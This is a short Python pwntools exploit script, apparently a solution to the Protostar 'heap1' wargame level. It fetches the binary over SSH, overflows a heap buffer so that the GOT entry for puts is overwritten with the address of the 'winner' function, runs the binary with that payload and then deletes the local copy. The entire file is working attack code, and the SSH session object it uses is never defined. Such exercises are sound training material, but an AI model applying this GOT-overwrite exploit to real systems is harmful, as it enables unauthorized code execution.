#!/usr/bin/python
from pwn import *
import os
from ssh import *

binarypath='/opt/protostar/bin/heap1'
sh.download(binarypath)
elf=ELF('./heap1')
payload1="A"*(4*5)+p32(elf.got['puts'])
payload2=p32(elf.symbols['winner'])
p=sh.run([binarypath,payload1,payload2])

print p.recvall()

os.system('rm heap1')